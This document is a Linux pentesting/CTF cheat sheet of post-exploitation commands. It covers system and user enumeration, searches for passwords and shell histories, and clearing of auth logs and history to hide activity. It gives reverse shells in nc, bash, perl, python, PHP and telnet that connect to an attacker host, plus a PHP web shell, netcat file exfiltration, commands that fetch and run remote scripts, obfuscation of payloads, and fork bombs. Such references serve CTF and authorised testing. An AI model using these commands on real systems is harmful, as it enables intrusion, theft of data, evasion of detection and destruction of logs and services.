PENTESTING/CTF COMMANDS


---ENUMERATION---

set	show lots of system info

----User Info
id	get current username and group
w	see logged on users
whoami	see current user
who -a	get user info
cat /etc/passwd | cut -d: -f 1	show accounts on system
cat /etc/group 	see user groups

---Superusers and Admin
cat /etc/group | grep admin	see which users are admin
grep -vE "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'	show all superusers
for i in $(cat /etc/passwd 2>/dev/null| cut -d: -f1 2>/dev/null);do id $i;done 2>/dev/null	show all user id's and groups
cat /etc/sudoers	see what users can run sudo

sudo -l	see what commands user can run as root (may require user pass)

find / -perm -4000 2>/dev/null	see what DIRs current user has permissions to access
sudo -l 2>/dev/null | grep -w 'nmap|perl|'awk'|'find'|'bash'|'sh'|'man'|'more'|'less'|'vi'|'vim'|'nc'|'netcat'|python|ruby|lua|irb' | xargs -r ls -la 2>/dev/null	see if current user can run any programs as root


----Kernel and OS Info
uname -r	Kernel Version
uname -m	Architecture
uname -n	Hostname
uname -a	All available information

cat /etc/issue	Show OS Info
cat /etc/*release*	Show OS version info
cat /proc/version	Show Kernel info

cat /etc/cron.d/automate	show scheduled crons


---Cron Jobs
cat /etc/crontab	view cron jobs

ls /var/spool/cron	show cron files
crontab -u root -l	lists cron jobs run as root
crontab -u USERNAME -l	lists cron jobs run as USER

for user in $(cut -d: -f1 /etc/passwd); do crontab -u  $user -l; done	Lists all crons


---Hardware Info
lspci	see hardware connected by PCI bus
lsusb	see hardware connected by USB

df -h	see mounted file systems and mount points
cat /proc/cpuinfo | less	see CPU information
cat /proc/meminfo | less	see memory information


---Networking Info
hostname -f	show hostname
which nc	see if system has nc installed (most do)
ifconfig -a	show interfaces, MACs, and IPs
ip a	on systems where ifconfig is deprecated	
netstat -tulpn | less	show current internet connections
cat /var/log/messages | grep DHCP	list DHCP traffic

One-stop Network Info Command - must be parsed:
cat /proc/net/* | less



---Recent Acitivy:
last -a	Show last users logged on
history	Show last commands entered
cat ~/.*sh_history	show shell history for current user
cat /home/USER/.*sh_history 2>/dev/null	show history for given user
find /home -type f -iname '.*history'	find history files
cat /home/*/.*hist* 2>/dev/null	show users history files. combine with grep!
cat /*/*/.*hist* 2>/dev/null	show EVERYONE's history files, comebine with grep!


---Current Activity:
ps aux	show all files
ps -ef | less	show top processes 

-----Software Versions:
gcc -v	return GCC version
mysql --version
perl -v
ruby -v
python --version
java -version

dpkg -l	show debian packages
rpm -qa	show Redhat/Fedora/CentOS Packages
pacman -Q	show Arch packages



ALWAYS RUN THESE COMMANDS
----Caveman Moves:

sudo su

cd /home/; grep -Ri 'password' . 2>/dev/null	look for the string 'password' in the /home/ dir
cd /dev/;  grep -Ri 'password' . 2>/dev/null	look for the string 'password' in the /dev/ dir



---CLEAN UP---
echo '' > /var/log/auth.log	clear auth log
echo '' > ~/.*sh_history	clear bash history file
shred -fuz ~/.*sh_history	destroy bash history file
history -c	clear history file for user

----BEING SNEAKY----
export HISTFILESIZE=0	set history max lines to 0
export HISTSIZE=0	set history max file size to 0
--- Make sure you set them back after!


--- IMPROVE SHELL ---
- GET TTY
- (TRY /bin/bash/ as well as /sh)
python -c 'import pty;pty.spawn("/bin/sh")'
echo os.system('/bin/sh')
/bin/sh -i   (best for Ubuntu Server)
perl â€”e 'exec "/bin/sh";'
IN A PERL SCRIPT:  exec "/bin/sh";
awk 'BEGIN {system("/bin/bash")}'

---ESCAPE RESTRICTED SHELL---
:!bash	From inside vi or vim
:set shell=/bin/sh <PRESS ENTER> :shell	from inside vi or vim
!bash	from less, man, more
!sh	from less, man, more
awk 'BEGIN {system("/bin/bash")}'

If confronted with -rbash on ssh login - append on of these command to ssh login...
ssh user@host python -c 'import pty;(pty.spawn("/bin/sh")'


---REVERSE SHELL COMMANDS---

Listener - first run this on local machine
nc -lnvp PORTNUM

	
Reverse Shell - to be run on remote machine when listener is up on local machine
nc local.machine.ip.addr PORTNUM -e /bin/sh	Unix Machines
nc local.machine.ip.addr PORTNUM -e cmd.exe	Windows machines

NC shell without e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc local.machine.ip.addr PORTNUM > /tmp/f


NCAT (is slightly different than NC) allows SSL
ncat -lvp PORTNUM --ssl	run on LOCAL
ncat -e /bin/sh -v local.machine.ip.addr PORTNUM --ssl	run on REMOTE

Bash-Only Rev Shell:
bash -i >& /dev/tcp/local.machine.ip.addr/PORTNUM 0>&1

or

exec 5<>/dev/tcp/local.machine.ip.addr/PORTNUM
cat <&5 | while read line; do $line 2>&5 >&5; done

PHP System Rev Shell:
php -r '$sock=fsockopen("local.machine.ip.addr","PORTNUM");exec("/bin/sh -i <&3 >&3 2>&3");'

PHP URL Command Shell:
<?php passthru($_GET["cmd"]); ?>	works when url user '?page=', use '?page=PAGENAME&cmd=COMMANDS'

Telnet Reverse Shell:
rm -f /tmp/p; mknod /tmp/p p && telnet local.machine.ip.addr PORTNUM 0/tmp/p
or
telnet local.machine.ip.addr PORTNUM_A | /bin/bash | telnet local.machine.ip.addr PORTNUM_B   # Remember to listen on PORTNUM_B

PERL Rev Shell
perl -e 'use Socket;$i="local.machine.ip.addr";$p=PORTNUM;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

PYTHON Rev Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("local.machine.ip.addr",PORTNUM));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PYTHON PTY REVERSE TCP SHELL (full tab complete, etc.)
-Make copy of tcp_pty_backconnect.py and tcp_pty_shell_handler.py to pentest dir
-change LHOST and LPORT to values of local machine in backconnect.py
-Obfuscate backconnect .py if neccessary, then get it on remote machine.
-python tcp_pty_shell_handler.py -b LHOST:LPORT
-Run backconnect.py on remote machine 

SSH Reverse shell
ssh -NR 3333:localhost:22 user@local.machine.ip.addr




--- NC AND NETCAT ---

nc -zv HOST START-END	port scanner - pretty fast too

nc -lp PORTNUM -e /bin/sh	run on remote machine, then connect from local
	
File Transfer -> Local to Remote
nc -lp PORTNUM < FILENAME	run on local
nc -w3 local.machine.ip.addr PORTNUM > FILENAME	run on remote

File Transfer -> Remote to Local
nc -lp PORTNUM > FILENAME	run on local
nc -w3 local.machine.ip.addr PORTNUM < FILENAME	run on remote

	When transferring files, the /dev/shm folder is just stored in RAM, so it is a good place to keep things. Utilize .'s at the beginning of file names for added secrecy

--- NCAT Features ---

NCAT SSL Bind Shell
ncat -lnvp PORTNUM -e /bin/sh --ssl	to listen
ncat LISTENING_IP PORTNUM --ssl	to speak

NCAT allow/deny flags
ncat -lnvp PORTNUM --allow GOOD_IP -e /bin/sh
ncat -lnvp PORTNUM --deny BAD_IP -e /bin/sh

ncat -lnvp PORTNUM --allowfile GOOD_IPs.txt -e /bin/sh
ncat -lnvp PORTNUM --denyfile BAD_IPs.txt -e /bin/sh

NCAT File Transfer with SSL
Remote to Local (Download)
ncat -lp PORTNUM --ssl > FILENAME	run on local
ncat --ssl --send-only LOCAL_MACHINE_IP PORTNUM < FILENAME	run on remote

Local to Remote (Upload)
ncat -ssl --send-only -lp PORTNUM < FILENAME	run on local
ncat LOCAL_MACHINE_IP PORTNUM --ssl > FILENAME	run on remote (this seems to hang)
curl https://LOCAL_MACHINE_IP:PORTNUM -k -o FILENAME



NMAP COMMANDS

nmap -sn -T4 The.IP.Addr.0/24	pings The.IP.Addr.0-255, discovers hosts
nmap -sV The.host.IP.addr 	enumerates versions of ports on host



REMOTE COMMANDS

wget http://server/file.sh -O- | sh	execute command from remote location
wget http://server/file.py -O- | python -	execute remote python script
wget http://server/file.pl -O- | pl -	execute remote perl script


curl -F 'f:1=@SCRIPT.FILE' ix.io	generates paste URL which can be accessed with wget



OBFUSCATION WITH ZSC
Requires https://github.com/viraintel/OWASP-ZSC
---REMEMBER TO REMOVE UNOBFUSCATED CODE FROM OUTPUT
---THIS OVERWRITES THE FILE

zsc -p python/simple_ascii -i 'HideMe.py'	
zsc -p python/simple_base64_rev -i 'HideMe.py'
zsc -p python/simple_hex -i 'HideMe.py'
zsc -p python/simple_hex_rev -i 'HideMe.py'	shorter than simple_hex
zsc -p python/rot13 -i 'HideMe.py'

also works for:
javascript, ruby, php and perl - simple_ascii/hex/base64/hex_rev/base64_rev


Use commands like this to get JUST the obfuscated code in a file

cp script.py output.py; 
lines=$(expr $(wc -l < output.py) + 4);
zsc -p python/simple_ascii -i output.py >> /dev/null;
tail +$lines output.py | python -
 
cp script.py output.py; lines=$(expr $(wc -l < output.py) + 4); zsc -p python/simple_ascii -i output.py >> /dev/null;
tail +$lines output.py | python -


OBFUSCATION WITH PYMINIFER (PYTHON ONLY)
pyminifier -O --nonlatin INFILE.PY | grep -vi 'pyminifier' > OUTFILE.py

USE THE CombObfuscator Script to accompish both quickly (FOR PYTHON)



-------------DO NOT USE THESE---------------------------

:(){ :|:& };:	Bash fork bomb
echo './bomb.txt' > bomb; chmod u+x bomb; ./bomb	fork bomb

EXPERIMENTAL
---Fork Bomb that leaves random files behind---- 
echo './fkfl >&1 & dd if=/dev/urandom of=$(cat /dev/urandom | tr -dc a-zA-Z0-9 | fold -w $(( (RANDOM % 100) +1 )) | head -n 1 ) bs=$(( (RANDOM % 9999999) + 1)) count=$(( (RANDOM % 100) +1 )) 2>/dev/null; ./fkfl'> fkfl; chmod u+x fkfl; ./fkfl
